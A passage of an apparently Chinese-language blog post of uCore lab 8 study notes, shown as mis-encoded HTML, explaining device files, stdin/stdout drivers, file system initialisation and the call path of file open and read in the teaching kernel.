·é€šè¿‡è®¿é—®æ­¤é“¾è¡¨ï¼Œå¯ä»¥æ‰¾åˆ°ucoreèƒ½å¤Ÿè®¿é—®çš„æ‰€æœ‰è®¾å¤‡æ–‡ä»¶ã€‚</p><p>ä½†è¿™ä¸ªè®¾å¤‡æè¿°æ²¡æœ‰ä¸æ–‡ä»¶ç³»ç»Ÿä»¥åŠè¡¨ç¤ºä¸€ä¸ªæ–‡ä»¶çš„inodeæ•°æ®ç»“æ„å»ºç«‹å…³ç³»ï¼Œä¸ºæ­¤ï¼Œè¿˜éœ€è¦å¦å¤–ä¸€ä¸ªæ•°æ®ç»“æ„æŠŠdeviceå’Œinodeè”é€šèµ·æ¥ï¼Œè¿™å°±æ˜¯vfs_dev_tæ•°æ®ç»“æ„ï¼š</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">// device info entry in vdev_list </span><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br>    <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *devname;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">inode</span> *<span class="hljs-title">devnode</span>;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">fs</span> *<span class="hljs-title">fs</span>;</span><br>    <span class="hljs-keyword">bool</span> mountable;<br>    <span class="hljs-keyword">list_entry_t</span> vdev_link;<br>&#125; <span class="hljs-keyword">vfs_dev_t</span>;<br></code></pre></div></td></tr></table></figure><p>åˆ©ç”¨<code>vfs_dev_t</code>æ•°æ®ç»“æ„ï¼Œå°±å¯ä»¥è®©æ–‡ä»¶ç³»ç»Ÿé€šè¿‡ä¸€ä¸ªé“¾æ¥<code>vfs_dev_t</code>ç»“æ„çš„åŒå‘é“¾è¡¨æ‰¾åˆ°deviceå¯¹åº”çš„inodeæ•°æ®ç»“æ„ï¼Œä¸€ä¸ªinodeèŠ‚ç‚¹çš„æˆå‘˜å˜é‡in_typeçš„å€¼æ˜¯0x1234ï¼Œåˆ™æ­¤ inodeçš„æˆå‘˜å˜é‡in_infoå°†æˆä¸ºä¸€ä¸ªdeviceç»“æ„ã€‚è¿™æ ·inodeå°±å’Œä¸€ä¸ªè®¾å¤‡å»ºç«‹äº†è”ç³»ï¼Œè¿™ä¸ªinodeå°±æ˜¯ä¸€ä¸ªè®¾å¤‡æ–‡ä»¶ã€‚</p><blockquote><p>å¯¹äºæ–‡ä»¶æ¥è¯´, inode-&gt;in_infoæ˜¯sfs_inodeç±»å‹, è®°å½•äº†æ–‡ä»¶åœ¨ç£ç›˜ä¸Šçš„ä¿¡æ¯;<br>è€Œå¯¹äºè®¾å¤‡æ¥è¯´, æ˜¯deviceç±»å‹, å­˜å‚¨ç€é’ˆå¯¹äºdeviceçš„æ“ä½œå‡½æ•°å’Œç›¸å…³ä¿¡æ¯.1</p></blockquote><h4 id="stdout"><a href="#stdout" class="headerlink" title="stdout"></a>stdout</h4><p><strong>åˆå§‹åŒ–</strong> </p><p>æ—¢ç„¶stdoutè®¾å¤‡æ˜¯è®¾å¤‡æ–‡ä»¶ç³»ç»Ÿçš„æ–‡ä»¶ï¼Œè‡ªç„¶æœ‰è‡ªå·±çš„inodeç»“æ„ã€‚åœ¨ç³»ç»Ÿåˆå§‹åŒ–æ—¶ï¼Œå³åªéœ€å¦‚ä¸‹å¤„ç†è¿‡ç¨‹</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c">kern_init--&gt;fs_init--&gt;dev_init--&gt;dev_init_stdout --&gt; dev_create_inode<br>                 --&gt; stdout_device_init<br>                 --&gt; vfs_add_dev<br></code></pre></div></td></tr></table></figure><p>åœ¨dev_init_stdoutä¸­å®Œæˆäº†å¯¹stdoutè®¾å¤‡æ–‡ä»¶çš„åˆå§‹åŒ–ã€‚å³é¦–å…ˆåˆ›å»ºäº†ä¸€ä¸ªinodeï¼Œç„¶åé€šè¿‡stdout_device_initå®Œæˆå¯¹inodeä¸­çš„æˆå‘˜å˜é‡inode-&gt;__device_infoè¿›è¡Œåˆå§‹ï¼š</p><p>è¿™é‡Œçš„stdoutè®¾å¤‡æ–‡ä»¶å®é™…ä¸Šå°±æ˜¯æŒ‡çš„consoleå¤–è®¾ï¼ˆå®ƒå…¶å®æ˜¯ä¸²å£ã€å¹¶å£å’ŒCGAçš„ç»„åˆå‹å¤–è®¾ï¼‰ã€‚è¿™ä¸ªè®¾å¤‡æ–‡ä»¶æ˜¯ä¸€ä¸ªåªå†™è®¾å¤‡ï¼Œå¦‚æœè¯»è¿™ä¸ªè®¾å¤‡ï¼Œå°±ä¼šå‡ºé”™ã€‚æ¥ä¸‹æ¥æˆ‘ä»¬çœ‹çœ‹stdoutè®¾å¤‡çš„ç›¸å…³å¤„ç†è¿‡ç¨‹ã€‚</p><p><strong>åˆå§‹åŒ–</strong> </p><p>stdoutè®¾å¤‡æ–‡ä»¶çš„åˆå§‹åŒ–è¿‡ç¨‹ä¸»è¦ç”±stdout_device_initå®Œæˆï¼Œå…¶å…·ä½“å®ç°å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span></span><br><span class="hljs-function"><span class="hljs-title">stdout_device_init</span><span class="hljs-params">(struct device *dev)</span> </span>&#123;<br>    dev-&gt;d_blocks = <span class="hljs-number">0</span>;<br>    dev-&gt;d_blocksize = <span class="hljs-number">1</span>;<br>    dev-&gt;d_open = stdout_open;<br>    dev-&gt;d_close = stdout_close;<br>    dev-&gt;d_io = stdout_io;<br>    dev-&gt;d_ioctl = stdout_ioctl;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°ï¼Œstdout_openå‡½æ•°å®Œæˆè®¾å¤‡æ–‡ä»¶æ‰“å¼€å·¥ä½œï¼Œå¦‚æœå‘ç°ç”¨æˆ·è¿›ç¨‹è°ƒç”¨openå‡½æ•°çš„å‚æ•°flagsä¸æ˜¯åªå†™ï¼ˆO_WRONLYï¼‰ï¼Œåˆ™ä¼šæŠ¥é”™ã€‚å³<code>stdout_open(struct device *dev, uint32_t open_flags)  </code> </p><p><strong>è®¿é—®æ“ä½œå®ç°</strong> </p><p>stdout_ioå‡½æ•°å®Œæˆè®¾å¤‡çš„å†™æ“ä½œå·¥ä½œ, <strong>å…·ä½“æ˜¯ä»iobufä¸­ä¸€ä¸ªä¸€ä¸ªå­—ç¬¦è¾“å‡ºåˆ°ä¸²å£å¹¶å£å’ŒCGAæ˜¾ç¤ºå™¨ä¸Š</strong>.</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span></span><br><span class="hljs-function"><span class="hljs-title">stdout_io</span><span class="hljs-params">(struct device *dev, struct iobuf *iob, <span class="hljs-keyword">bool</span> write)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (write) &#123;<br>        <span class="hljs-keyword">char</span> *data = iob-&gt;io_base;<br>        <span class="hljs-keyword">for</span> (; iob-&gt;io_resid != <span class="hljs-number">0</span>; iob-&gt;io_resid --) &#123;<br>            cputchar(*data ++);<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> -E_INVAL;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°ï¼Œè¦å†™çš„æ•°æ®æ”¾åœ¨iob-&gt;io_baseæ‰€æŒ‡çš„å†…å­˜åŒºåŸŸï¼Œä¸€ç›´å†™åˆ°iob-&gt;io_residçš„å€¼ä¸º0ä¸ºæ­¢ã€‚æ¯æ¬¡å†™æ“ä½œéƒ½æ˜¯é€šè¿‡cputcharæ¥å®Œæˆçš„ï¼Œæ­¤å‡½æ•°æœ€ç»ˆå°†é€šè¿‡consoleå¤–è®¾é©±åŠ¨æ¥å®ŒæˆæŠŠæ•°æ®è¾“å‡ºåˆ°ä¸²å£ã€å¹¶å£å’ŒCGAæ˜¾ç¤ºå™¨ä¸Šè¿‡ç¨‹ã€‚å¦å¤–ï¼Œä¹Ÿå¯ä»¥æ³¨æ„åˆ°ï¼Œå¦‚æœç”¨æˆ·æƒ³æ‰§è¡Œè¯»æ“ä½œï¼Œåˆ™stdout_ioå‡½æ•°ç›´æ¥è¿”å›é”™è¯¯å€¼**-**E_INVALã€‚</p><h4 id="stdin"><a href="#stdin" class="headerlink" title="stdin"></a>stdin</h4><p>è¿™é‡Œçš„stdinè®¾å¤‡æ–‡ä»¶å®é™…ä¸Šå°±æ˜¯æŒ‡çš„é”®ç›˜ã€‚è¿™ä¸ªè®¾å¤‡æ–‡ä»¶æ˜¯ä¸€ä¸ªåªè¯»è®¾å¤‡ï¼Œå¦‚æœå†™è¿™ä¸ªè®¾å¤‡ï¼Œå°±ä¼šå‡ºé”™ã€‚æ¥ä¸‹æ¥æˆ‘ä»¬çœ‹çœ‹stdinè®¾å¤‡çš„ç›¸å…³å¤„ç†è¿‡ç¨‹ã€‚</p><p><strong>åˆå§‹åŒ–</strong> </p><p>stdinè®¾å¤‡æ–‡ä»¶çš„åˆå§‹åŒ–è¿‡ç¨‹ä¸»è¦ç”±stdin_device_initå®Œæˆäº†ä¸»è¦çš„åˆå§‹åŒ–å·¥ä½œï¼Œå…·ä½“å®ç°å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span></span><br><span class="hljs-function"><span class="hljs-title">stdin_device_init</span><span class="hljs-params">(struct device *dev)</span> </span>&#123;<br>    dev-&gt;d_blocks = <span class="hljs-number">0</span>;<br>    dev-&gt;d_blocksize = <span class="hljs-number">1</span>;<br>    dev-&gt;d_open = stdin_open;<br>    dev-&gt;d_close = stdin_close;<br>    dev-&gt;d_io = stdin_io;<br>    dev-&gt;d_ioctl = stdin_ioctl;<br><span class="hljs-comment">/* è¿™ç©æ„å„¿æ˜¯ä¸€ä¸ªåœ¨dev_stdin.cä¸­çš„å…¨å±€é™æ€å˜é‡, </span><br><span class="hljs-comment">     * åˆ†åˆ«æ˜¯pointer_read_position and p_write_position</span><br><span class="hljs-comment">     * å¦‚æœread_pos &lt; write_posåˆ™è¯´æ˜æœ‰æ–°å­—ç¬¦</span><br><span class="hljs-comment">    p_rpos = p_wpos = 0; </span><br><span class="hljs-comment">    wait_queue_init(wait_queue);</span><br><span class="hljs-comment">&#125;</span><br></code></pre></div></td></tr></table></figure><p>ç›¸å¯¹äºstdoutçš„åˆå§‹åŒ–è¿‡ç¨‹ï¼Œstdinçš„åˆå§‹åŒ–ç›¸å¯¹å¤æ‚ä¸€äº›ï¼Œå¤šäº†ä¸€ä¸ªstdin_bufferç¼“å†²åŒºï¼Œæè¿°ç¼“å†²åŒºè¯»å†™ä½ç½®çš„å˜é‡p_rposã€p_wposä»¥åŠç”¨äºç­‰å¾…ç¼“å†²åŒºçš„ç­‰å¾…é˜Ÿåˆ—wait_queueã€‚åœ¨stdin_device_initå‡½æ•°çš„åˆå§‹åŒ–ä¸­ï¼Œä¹Ÿå®Œæˆäº†å¯¹p_rposã€p_wposå’Œwait_queueçš„åˆå§‹åŒ–ã€‚</p><p><strong>è®¿é—®æ“ä½œå®ç°</strong> </p><p>stdin_ioå‡½æ•°è´Ÿè´£å®Œæˆè®¾å¤‡çš„è¯»æ“ä½œå·¥ä½œï¼Œå…·ä½“å®ç°å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span></span><br><span class="hljs-function"><span class="hljs-title">stdin_io</span><span class="hljs-params">(struct device *dev, struct iobuf *iob, <span class="hljs-keyword">bool</span> write)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (!write) &#123;<br>        <span class="hljs-keyword">int</span> ret;<br>        <span class="hljs-keyword">if</span> ((ret = dev_stdin_read(iob-&gt;io_base, iob-&gt;io_resid)) &gt; <span class="hljs-number">0</span>) &#123;<br>            iob-&gt;io_resid -= ret;<br>        &#125;<br>        <span class="hljs-keyword">return</span> ret;<br>    &#125;<br>    <span class="hljs-keyword">return</span> -E_INVAL;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°ï¼Œå¦‚æœæ˜¯å†™æ“ä½œï¼Œåˆ™stdin_ioå‡½æ•°ç›´æ¥æŠ¥é”™è¿”å›ã€‚æ‰€ä»¥è¿™ä¹Ÿè¿›ä¸€æ­¥è¯´æ˜äº†æ­¤è®¾å¤‡æ–‡ä»¶æ˜¯åªè¯»æ–‡ä»¶ã€‚å¦‚æœæ­¤è¯»æ“ä½œï¼Œåˆ™æ­¤å‡½æ•°è¿›ä¸€æ­¥è°ƒç”¨dev_stdin_readå‡½æ•°å®Œæˆå¯¹é”®ç›˜è®¾å¤‡çš„è¯»å…¥æ“ä½œã€‚dev_stdin_readå‡½æ•°çš„å®ç°ç›¸å¯¹å¤æ‚ä¸€äº›ï¼Œä¸»è¦çš„æµç¨‹å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span></span><br><span class="hljs-function"><span class="hljs-title">dev_stdin_read</span><span class="hljs-params">(<span class="hljs-keyword">char</span> *buf, <span class="hljs-keyword">size_t</span> len)</span> </span>&#123;<br>    <span class="hljs-keyword">int</span> ret = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">bool</span> intr_flag;<br>    local_intr_save(intr_flag);<br>    &#123;<br>        <span class="hljs-keyword">for</span> (; ret &lt; len; ret ++, p_rpos ++) &#123;<br>        try_again:<br>            <span class="hljs-keyword">if</span> (p_rpos &lt; p_wpos) &#123; <br>                *buf ++ = stdin_buffer[p_rpos % stdin_BUFSIZE];<br>            &#125;<br>            <span class="hljs-keyword">else</span> &#123; <span class="hljs-comment">//æ²¡æœ‰æ–°å­—ç¬¦å°±è¦è¿›è¡Œç¡çœ å¹¶ä¸”è°ƒåº¦</span><br>                <span class="hljs-keyword">wait_t</span> __wait, *wait = &amp;__wait;<br>                wait_current_set(wait_queue, wait, WT_KBD);<br>                local_intr_restore(intr_flag);<br><br>                schedule();<br><br>                local_intr_save(intr_flag);<br>                wait_current_del(wait_queue, wait);<br>                <span class="hljs-keyword">if</span> (wait-&gt;wakeup_flags == WT_KBD) &#123;<br>                    <span class="hljs-keyword">goto</span> try_again;<br>                &#125;<br>                <span class="hljs-keyword">break</span>;<br>            &#125;<br>        &#125;<br>    &#125;<br>    local_intr_restore(intr_flag);<br>    <span class="hljs-keyword">return</span> ret;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>åœ¨ä¸Šè¿°å‡½æ•°ä¸­å¯ä»¥çœ‹å‡ºï¼Œå¦‚æœ<code>p_rpos</code> &lt; <code>p_wpos</code>ï¼Œåˆ™è¡¨ç¤ºæœ‰é”®ç›˜è¾“å…¥çš„æ–°å­—ç¬¦åœ¨stdin_bufferä¸­ï¼Œäºæ˜¯å°±ä»stdin_bufferä¸­å–å‡ºæ–°å­—ç¬¦æ”¾åˆ°iobufæŒ‡å‘çš„ç¼“å†²åŒºä¸­ï¼›å¦‚æœ<code>p_rpos</code> &gt;=<code>p_wpos</code>ï¼Œåˆ™è¡¨æ˜æ²¡æœ‰æ–°å­—ç¬¦ï¼Œè¿™æ ·è°ƒç”¨readç”¨æˆ·æ€åº“å‡½æ•°çš„ç”¨æˆ·è¿›ç¨‹å°±éœ€è¦é‡‡ç”¨ç­‰å¾…é˜Ÿåˆ—çš„ç¡çœ æ“ä½œè¿›å…¥ç¡çœ çŠ¶æ€ï¼Œç­‰å¾…é”®ç›˜è¾“å…¥å­—ç¬¦çš„äº§ç”Ÿã€‚</p><p>é”®ç›˜è¾“å…¥å­—ç¬¦åï¼Œå¦‚ä½•å”¤é†’ç­‰å¾…é”®ç›˜è¾“å…¥çš„ç”¨æˆ·è¿›ç¨‹å‘¢ï¼Ÿå›é¡¾lab1ä¸­çš„å¤–è®¾ä¸­æ–­å¤„ç†ï¼Œå¯ä»¥äº†è§£åˆ°ï¼Œå½“ç”¨æˆ·æ•²å‡»é”®ç›˜æ—¶ï¼Œä¼šäº§ç”Ÿé”®ç›˜ä¸­æ–­ï¼Œåœ¨trap_dispatchå‡½æ•°ä¸­ï¼Œå½“è¯†åˆ«å‡ºä¸­æ–­æ˜¯é”®ç›˜ä¸­æ–­ï¼ˆä¸­æ–­å·ä¸ºIRQ_OFFSET + IRQ_KBDï¼‰æ—¶ï¼Œä¼šè°ƒç”¨dev_stdin_writeå‡½æ•°ï¼Œæ¥æŠŠå­—ç¬¦å†™å…¥åˆ°stdin_bufferä¸­ï¼Œä¸”ä¼šé€šè¿‡ç­‰å¾…é˜Ÿåˆ—çš„å”¤é†’æ“ä½œå”¤é†’æ­£åœ¨ç­‰å¾…é”®ç›˜è¾“å…¥çš„ç”¨æˆ·è¿›ç¨‹ã€‚</p><h3 id="æ–‡ä»¶ç³»ç»Ÿåˆå§‹åŒ–"><a href="#æ–‡ä»¶ç³»ç»Ÿåˆå§‹åŒ–" class="headerlink" title=".æ–‡ä»¶ç³»ç»Ÿåˆå§‹åŒ–"></a>.æ–‡ä»¶ç³»ç»Ÿåˆå§‹åŒ–</h3><blockquote><p>æŒ‡å¯¼ä¹¦å†™çš„çœŸå¥½, åˆæƒ³å¤åˆ¶äº†(</p></blockquote><p>é¦–å…ˆçœ‹çœ‹kern_initå‡½æ•°ï¼Œå¯ä»¥å‘ç°ä¸lab7ç›¸æ¯”å¢åŠ äº†å¯¹fs_initå‡½æ•°çš„è°ƒç”¨ã€‚fs_initå‡½æ•°å°±æ˜¯æ–‡ä»¶ç³»ç»Ÿåˆå§‹åŒ–çš„æ€»æ§å‡½æ•°ï¼Œå®ƒè¿›ä¸€æ­¥è°ƒç”¨äº†è™šæ‹Ÿæ–‡ä»¶ç³»ç»Ÿåˆå§‹åŒ–å‡½æ•°vfs_initï¼Œä¸æ–‡ä»¶ç›¸å…³çš„è®¾å¤‡åˆå§‹åŒ–å‡½æ•°dev_initå’ŒSimple FSæ–‡ä»¶ç³»ç»Ÿçš„åˆå§‹åŒ–å‡½æ•°sfs_initã€‚è¿™ä¸‰ä¸ªåˆå§‹åŒ–å‡½æ•°è”åˆåœ¨ä¸€èµ·ï¼ŒååŒå®Œæˆäº†æ•´ä¸ªè™šæ‹Ÿæ–‡ä»¶ç³»ç»Ÿã€SFSæ–‡ä»¶ç³»ç»Ÿå’Œæ–‡ä»¶ç³»ç»Ÿå¯¹åº”çš„è®¾å¤‡ï¼ˆé”®ç›˜ã€ä¸²å£ã€ç£ç›˜ï¼‰çš„åˆå§‹åŒ–å·¥ä½œã€‚å…¶å‡½æ•°è°ƒç”¨å…³ç³»å›¾å¦‚ä¸‹æ‰€ç¤ºï¼š</p><p><img src="../../image/ucore/image-20220107165956521.png" alt="image-20220107165956521"></p><p>å‚è€ƒä¸Šå›¾ï¼Œå¹¶ç»“åˆæºç åˆ†æï¼Œå¯å¤§è‡´äº†è§£åˆ°æ–‡ä»¶ç³»ç»Ÿçš„æ•´ä¸ªåˆå§‹åŒ–æµç¨‹ã€‚</p><ul><li>vfs_initä¸»è¦å»ºç«‹äº†ä¸€ä¸ªdevice liståŒå‘é“¾è¡¨vdev_listï¼Œä¸ºåç»­å…·ä½“è®¾å¤‡ï¼ˆé”®ç›˜ã€ä¸²å£ã€ç£ç›˜ï¼‰ä»¥æ–‡ä»¶çš„å½¢å¼å‘ˆç°å»ºç«‹æŸ¥æ‰¾è®¿é—®é€šé“ã€‚</li><li>dev_initå‡½æ•°é€šè¿‡è¿›ä¸€æ­¥è°ƒç”¨disk0/stdin/stdout_device_initå®Œæˆå¯¹å…·ä½“è®¾å¤‡çš„åˆå§‹åŒ–ï¼ŒæŠŠå®ƒä»¬æŠ½è±¡æˆä¸€ä¸ªè®¾å¤‡æ–‡ä»¶ï¼Œå¹¶å»ºç«‹å¯¹åº”çš„inodeæ•°æ®ç»“æ„ï¼Œæœ€åæŠŠå®ƒä»¬é“¾å…¥åˆ°vdev_listä¸­ã€‚è¿™æ ·é€šè¿‡è™šæ‹Ÿæ–‡ä»¶ç³»ç»Ÿå°±å¯ä»¥æ–¹ä¾¿åœ°ä»¥æ–‡ä»¶çš„å½¢å¼è®¿é—®è¿™äº›è®¾å¤‡äº†ã€‚</li><li>sfs_initæ˜¯å®Œæˆå¯¹Simple FSçš„åˆå§‹åŒ–å·¥ä½œï¼Œå¹¶æŠŠæ­¤å®ä¾‹æ–‡ä»¶ç³»ç»ŸæŒ‚åœ¨è™šæ‹Ÿæ–‡ä»¶ç³»ç»Ÿä¸­ï¼Œä»è€Œè®©ucoreçš„å…¶ä»–éƒ¨åˆ†èƒ½å¤Ÿé€šè¿‡è®¿é—®è™šæ‹Ÿæ–‡ä»¶ç³»ç»Ÿçš„æ¥å£æ¥è¿›ä¸€æ­¥è®¿é—®åˆ°SFSå®ä¾‹æ–‡ä»¶ç³»ç»Ÿã€‚</li></ul><h2 id="ç»ƒä¹ -5"><a href="#ç»ƒä¹ -5" class="headerlink" title="ç»ƒä¹ "></a>ç»ƒä¹ </h2><h3 id="ç»ƒä¹ 1-5"><a href="#ç»ƒä¹ 1-5" class="headerlink" title="ç»ƒä¹ 1"></a>ç»ƒä¹ 1</h3><h4 id="openfile"><a href="#openfile" class="headerlink" title="openfile"></a>openfile</h4><blockquote><p>å‘ç°æ²¡æœ‰è®²åˆ°çš„è·¯å¾„æ ¼å¼: </p><ul><li><p>device:/path  </p>  <figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">/** æˆ–è€…:</span><br><span class="hljs-comment">* we have either /path or :path</span><br><span class="hljs-comment">* /path is a path relative to the root of the &quot;boot filesystem&quot;</span><br><span class="hljs-comment">* :path is a path relative to the root of the current filesystem</span><br><span class="hljs-comment">* */</span><br></code></pre></div></td></tr></table></figure></li></ul></blockquote><p>é¦–å…ˆè´´ä¸€å¼ å‡½æ•°è°ƒç”¨å›¾:</p><p><img src="../../image/ucore/Calls-file_open.png" alt="Calls-file_open"></p><p>åŸºæœ¬ä¸Šéƒ½æœ‰å¤šè·¯åˆ†æ”¯, å…·ä½“å¯ä»¥çœ‹æºç , è¿™é‡Œè®²ä¸ªå¤§æ¦‚.</p><ul><li><p>é€šè¿‡ç”¨æˆ·libcåº“ä¸­çš„syscallè°ƒç”¨sys_open, ä¸€ç›´åˆ°ä¸­æ–­å¤„ç†è½¬åˆ°file_open.</p></li><li><p>è¿™ä¸ªå‡½æ•°å°±æ‰§è¡Œä¸€ä¸ªç®€å•æ£€æŸ¥ä»¥åŠè°ƒç”¨äº†vfs_open(æœ€é‡è¦çš„å‡½æ•°)</p></li><li><p>å¦‚æœä¸€åˆ‡æ­£å¸¸, åªä¼šæ‰§è¡Œvfs_lookup. </p><ul><li><p>ç¬¬ä¸€ä¸ªget_deviceæ˜¯è§£æè·¯å¾„çš„, å¦‚æœpathæ²¡æœ‰æŒ‡å®šè®¾å¤‡åç§°è¯´æ˜åªæ˜¯ä¸€ä¸ªç›¸å¯¹è·¯å¾„, å°±ä¼šæ‰§è¡Œvfs_getdir</p></li><li><p>ç„¶åä¼šè°ƒç”¨sfs_lookup(é€šè¿‡å®å®šä¹‰), é€šè¿‡pathæ‰¾åˆ°å¯¹åº”çš„inode, ä¸‹é¢æ˜¯ä»–çš„è°ƒç”¨å›¾</p><p><img src="../../image/ucore/image-20220108132923299.png" alt="image-20220108132923299"></p></li></ul></li></ul><h4 id="read-write-file"><a href="#read-write-file" class="headerlink" title="[read,write]file"></a>[read,write]file</h4><p>è°ƒç”¨å…³ç³»å¦‚ä¸‹:</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c">sys_read(through syscall)-&gt;sys_fileread-&gt;file_read-&gt;vop_read(sfs_read)-&gt;sfs_io-&gt;sys_io_nolock<br></code></pre></div></td></tr></table></figure><ul><li>åœ¨<code>sysfile_read</code>é‡Œè®¾ç½®äº†ä¸€ä¸ª4KBçš„buff, ä¸»è¦è°ƒç”¨äº†file_readå‡½æ•°å°†æ–‡ä»¶ä¸­çš„å†…å®¹è¯»å–åˆ°<strong>å†…æ ¸</strong>buffä¸­, ç„¶åå†è°ƒç”¨copy_to_user()å¤åˆ¶åˆ°ç”¨æˆ·ç©ºé—´.  æ¯ä¸€æ¬¡åªä¼šè¯»å–4096å­—èŠ‚æ•°æ®åˆ°bufferä¸­, ç„¶åç»§ç»­ä¸‹ä¸€æ¬¡çš„å¡«å……ç¼“å†²åŒº.<ul><li>copy_to_user()çš„åŸå› æ˜¯copy_to_userèƒ½å¤Ÿæ£€æŸ¥åœ°å€åˆæ³•æ€§å’Œå¯ç”¨æ€§. æ¯”å•çº¯çš„memcpyå®‰å…¨, è€Œä¸”å†…æ ¸å’Œç”¨æˆ·åœ°å€ç©ºé—´çš„å¤åˆ¶åŸºæœ¬éƒ½æ˜¯é€šè¿‡è¿™ä¸ªå‡½æ•°æ¥å®Œæˆçš„.</li></ul></li><li>file_readåˆ†é…fileç»“æ„ä½“, è®¾ç½®æ–‡ä»¶è®¡æ•°ä»¥åŠç§»åŠ¨æ–‡ä»¶æŒ‡é’ˆ+ç¼“å†²åŒºiobuf, ç»§ç»­è°ƒç”¨sfs_read-&gt;sfs_io(sfs_inode.c)</li><li>sfs_ioé€šè¿‡ç¬¬ä¸‰ä¸ªå‚æ•°æ¥åˆ¤æ–­æ˜¯è¯»è¿˜æ˜¯å†™, æ¥ç€è°ƒç”¨sfs_io_nolock</li><li>æ¥ä¸‹æ¥å°±æ˜¯ç»ƒä¹ çš„å†…å®¹, read different kind of blocks in file</li></ul><blockquote><p>struct fs åŒ…è£…äº†sfs_fså’Œä¸€äº›å¯¹sfs_fsçš„æ“ä½œ</p><p>ä»£ç åˆ†æäº†ä¸€é, è€Œä¸”è‚–ä½¬å†™çš„é‚£å‡ ä¸ªéƒ¨åˆ†éƒ½çœ‹è¿‡äº†, å®åœ¨æ˜¯ä¸æƒ³å†™é‚£ä¹ˆå¤š, æƒ³çœ‹ç›´æ¥çœ‹ç°æˆçš„å§â€¦[<a href="https://kiprey.github.io/2020/09/uCore-8/#9-uCore%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F%E5%AE%9E%E7%8E%B0">link</a>]</p></blockquote><p>åŸºæœ¬çœ‹æ‡‚äº†, å†™äº†ä¸€å †æ³¨é‡Šåœ¨æºä»£ç é‡Œé¢.(<code>sfs_inode.c:595</code>)</p><figure class="highlight 